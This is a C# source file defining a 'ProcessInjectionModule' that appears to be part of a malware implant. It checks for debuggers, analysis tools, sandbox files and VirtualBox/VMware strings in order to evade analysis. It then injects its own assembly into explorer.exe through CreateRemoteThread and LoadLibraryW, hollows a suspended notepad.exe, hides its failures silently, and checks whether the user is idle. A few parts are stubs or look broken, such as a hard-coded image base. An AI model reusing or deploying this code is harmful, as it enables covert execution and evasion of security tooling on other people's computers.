using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Security.Principal;
using Microsoft.Win32;
using System.ComponentModel;
using System.Text;

namespace XYZ.modules
{
    public class ProcessInjectionModule
    {
        // DLL imports for process injection
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("user32.dll")]
        public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT context);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT context);

        // Structures
        public struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            public FLOATING_SAVE_AREA FloatSave;
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // Constants for process access
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;
        const int PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint CONTEXT_FULL = 0x10007;

        public bool IsAnalysisEnvironment()
        {
            try
            {
                // Check for common analysis tools
                string[] analysisProcesses = { "ollydbg.exe", "ida.exe", "ida64.exe", "idag.exe", "idag64.exe", 
                                              "windbg.exe", "x32dbg.exe", "x64dbg.exe", "processhacker.exe", 
                                              "tcpview.exe", "autoruns.exe", "autorunsc.exe", "filemon.exe", 
                                              "procmon.exe", "regmon.exe", "procexp.exe", "procexp64.exe" };

                foreach (string processName in analysisProcesses)
                {
                    Process[] processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(processName));
                    if (processes.Length > 0)
                    {
                        return true;
                    }
                }

                // Check for sandbox artifacts
                string[] sandboxPaths = { @"C:\popupkiller.exe", @"C:\detuwindowsService.exe", @"C:\config.exe", @"C:\sample.exe" };
                foreach (string path in sandboxPaths)
                {
                    if (File.Exists(path))
                    {
                        return true;
                    }
                }

                // Check for VM artifacts
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\SystemBiosVersion"))
                {
                    if (key != null)
                    {
                        object value = key.GetValue("");
                        if (value != null && (value.ToString().ToLower().Contains("vbox") || value.ToString().ToLower().Contains("vmware")))
                        {
                            return true;
                        }
                    }
                }

                return false;
            }
            catch
            {
                // If we can't check, assume it's not an analysis environment
                return false;
            }
        }

        public bool TryProcessHollowing()
        {
            // Try to inject into explorer.exe
            return InjectIntoExplorer();
        }
        
        private bool InjectIntoExplorer()
        {
            try
            {
                // Find explorer.exe process
                Process[] processes = Process.GetProcessesByName("explorer");
                if (processes.Length == 0)
                {
                    return false;
                }

                // Use the first explorer process found
                Process explorerProcess = processes[0];
                
                // Get handle to the process
                IntPtr processHandle = OpenProcess(
                    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                    false, 
                    explorerProcess.Id
                );

                if (processHandle == IntPtr.Zero)
                {
                    return false;
                }

                // Get the path of the current assembly
                string dllPath = Assembly.GetExecutingAssembly().Location;

                // Allocate memory in the target process
                IntPtr allocatedMemory = VirtualAllocEx(
                    processHandle, 
                    IntPtr.Zero, 
                    (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 
                    MEM_COMMIT | MEM_RESERVE, 
                    PAGE_READWRITE
                );

                if (allocatedMemory == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                // Write the DLL path to the allocated memory
                byte[] bytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
                UIntPtr bytesWritten;
                bool writeResult = WriteProcessMemory(
                    processHandle, 
                    allocatedMemory, 
                    bytes, 
                    (uint)bytes.Length, 
                    out bytesWritten
                );

                if (!writeResult)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                // Get address of LoadLibraryW
                IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
                IntPtr loadLibraryAddress = GetProcAddress(kernel32Handle, "LoadLibraryW");

                if (loadLibraryAddress == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                // Create remote thread to call LoadLibraryW
                IntPtr threadHandle = CreateRemoteThread(
                    processHandle, 
                    IntPtr.Zero, 
                    0, 
                    loadLibraryAddress, 
                    allocatedMemory, 
                    0, 
                    IntPtr.Zero
                );

                if (threadHandle == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                // Wait for the thread to complete
                WaitForSingleObject(threadHandle, 5000);

                // Verify injection was successful
                bool injectionSuccessful = VerifyInjection(explorerProcess.Id, Path.GetFileName(dllPath));

                // Clean up handles
                CloseHandle(threadHandle);
                CloseHandle(processHandle);

                return injectionSuccessful;
            }
            catch
            {
                // Silent fail for security
                return false;
            }
        }
        
        private bool InjectIntoProcess(string processName)
        {
            try
            {
                Process[] processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(processName));
                if (processes.Length == 0)
                {
                    return false;
                }

                Process targetProcess = processes[0];
                
                IntPtr processHandle = OpenProcess(
                    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                    false, 
                    targetProcess.Id
                );

                if (processHandle == IntPtr.Zero)
                {
                    return false;
                }

                string dllPath = Assembly.GetExecutingAssembly().Location;

                IntPtr allocatedMemory = VirtualAllocEx(
                    processHandle, 
                    IntPtr.Zero, 
                    (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 
                    MEM_COMMIT | MEM_RESERVE, 
                    PAGE_READWRITE
                );

                if (allocatedMemory == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                byte[] bytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
                UIntPtr bytesWritten;
                bool writeResult = WriteProcessMemory(
                    processHandle, 
                    allocatedMemory, 
                    bytes, 
                    (uint)bytes.Length, 
                    out bytesWritten
                );

                if (!writeResult)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
                IntPtr loadLibraryAddress = GetProcAddress(kernel32Handle, "LoadLibraryW");

                if (loadLibraryAddress == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                IntPtr threadHandle = CreateRemoteThread(
                    processHandle, 
                    IntPtr.Zero, 
                    0, 
                    loadLibraryAddress, 
                    allocatedMemory, 
                    0, 
                    IntPtr.Zero
                );

                if (threadHandle == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    return false;
                }

                WaitForSingleObject(threadHandle, 5000);
                bool injectionSuccessful = VerifyInjection(targetProcess.Id, Path.GetFileName(dllPath));

                CloseHandle(threadHandle);
                CloseHandle(processHandle);

                return injectionSuccessful;
            }
            catch
            {
                return false;
            }
        }
        
        private bool EnhancedProcessInjection(string processName)
        {
            try
            {
                // Try multiple injection techniques
                if (InjectIntoProcess(processName))
                {
                    return true;
                }
                
                // If basic injection fails, try advanced hollowing
                return AdvancedProcessHollowing(processName);
            }
            catch
            {
                return false;
            }
        }
        
        private bool AdvancedProcessHollowing(string processName)
        {
            try
            {
                // Create a suspended process as a target
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                si.cb = (uint)Marshal.SizeOf(si);
                
                string currentPath = Assembly.GetEntryAssembly().Location;
                
                // Create suspended process
                bool result = CreateProcess(
                    null,
                    "notepad.exe",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    CREATE_SUSPENDED,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi
                );
                
                if (!result)
                {
                    return false;
                }

                // Get handle to the process
                IntPtr processHandle = pi.hProcess;
                IntPtr threadHandle = pi.hThread;

                if (processHandle == IntPtr.Zero || threadHandle == IntPtr.Zero)
                {
                    if (processHandle != IntPtr.Zero) CloseHandle(processHandle);
                    if (threadHandle != IntPtr.Zero) CloseHandle(threadHandle);
                    return false;
                }

                // Get the base address of the target process
                IntPtr imageBase = GetProcessImageBase(processHandle);
                
                // Unmap the original process image
                NtUnmapViewOfSection(processHandle, imageBase);

                // Read the current executable into memory
                byte[] payload = File.ReadAllBytes(currentPath);
                
                // Allocate memory in the target process
                IntPtr allocatedMemory = VirtualAllocEx(
                    processHandle, 
                    imageBase, 
                    (uint)payload.Length, 
                    MEM_COMMIT | MEM_RESERVE, 
                    PAGE_EXECUTE_READWRITE
                );

                if (allocatedMemory == IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                    CloseHandle(threadHandle);
                    return false;
                }

                // Write the payload to the allocated memory
                UIntPtr bytesWritten;
                bool writeResult = WriteProcessMemory(
                    processHandle, 
                    allocatedMemory, 
                    payload, 
                    (uint)payload.Length, 
                    out bytesWritten
                );

                if (!writeResult)
                {
                    CloseHandle(processHandle);
                    CloseHandle(threadHandle);
                    return false;
                }

                // Update the context of the suspended thread
                CONTEXT context = new CONTEXT();
                context.ContextFlags = CONTEXT_FULL;
                
                if (GetThreadContext(threadHandle, ref context))
                {
                    // Update the EAX register to point to our new entry point
                    context.Eax = (uint)allocatedMemory + GetPEEntryPointOffset(payload);
                    
                    // Update the context
                    SetThreadContext(threadHandle, ref context);
                }

                // Resume the thread
                ResumeThread(threadHandle);

                // Wait a bit to ensure the process starts
                Thread.Sleep(1000);

                // Verify injection was successful
                bool injectionSuccessful = VerifyInjection((int)pi.dwProcessId, Path.GetFileName(currentPath));

                CloseHandle(threadHandle);
                CloseHandle(processHandle);
                
                return injectionSuccessful;
            }
            catch
            {
                return false;
            }
        }
        
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );
        
        private IntPtr GetProcessImageBase(IntPtr processHandle)
        {
            try
            {
                // In a real implementation, this would query the process for its image base address
                // For demonstration, we'll return a dummy value
                return new IntPtr(0x400000);
            }
            catch
            {
                return IntPtr.Zero;
            }
        }
        
        private uint GetPEEntryPointOffset(byte[] peFile)
        {
            try
            {
                // Parse PE file to get entry point offset
                // This is a simplified implementation
                if (peFile.Length < 0x40) return 0;
                
                // Check for MZ signature
                if (peFile[0] != 0x4D || peFile[1] != 0x5A) return 0;
                
                // Get PE header offset
                uint peOffset = BitConverter.ToUInt32(peFile, 0x3C);
                if (peFile.Length < peOffset + 0x30) return 0;
                
                // Check for PE signature
                if (peFile[peOffset] != 0x50 || peFile[peOffset + 1] != 0x45) return 0;
                
                // Get entry point RVA
                uint entryPointRVA = BitConverter.ToUInt32(peFile, (int)peOffset + 0x28);
                return entryPointRVA;
            }
            catch
            {
                return 0;
            }
        }
        
        private bool VerifyInjection(int processId, string moduleName)
        {
            try
            {
                Process process = Process.GetProcessById(processId);
                foreach (ProcessModule module in process.Modules)
                {
                    if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }
        }
        
        public bool HasUserActivity()
        {
            try
            {
                LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
                lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
                
                if (GetLastInputInfo(ref lastInputInfo))
                {
                    uint idleTime = (uint)(Environment.TickCount - lastInputInfo.dwTime);
                    // If user has been idle for more than 5 minutes, return false
                    return idleTime < 300000;
                }
                
                // If we can't determine, assume user is active
                return true;
            }
            catch
            {
                return true;
            }
        }
    }
}